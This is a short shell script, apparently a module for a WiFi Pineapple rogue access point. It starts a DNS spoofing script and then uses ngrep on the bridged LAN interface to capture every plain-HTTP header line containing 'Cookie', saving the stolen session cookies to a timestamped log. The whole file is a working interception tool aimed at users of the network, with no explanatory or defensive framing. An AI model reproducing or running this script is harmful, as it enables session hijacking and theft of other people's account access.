#!/bin/sh

MYPATH="$(dirname $0)/"
MYTIME=`date +%s`

echo '' > /pineapple/logs/dnsspoof.log
echo /pineapple/dnsspoof/dnsspoof.sh | at now

ngrep -q -d br-lan -W byline -t 'Cookie' 'tcp and port 80' > ${MYPATH}log/output_${MYTIME}.log &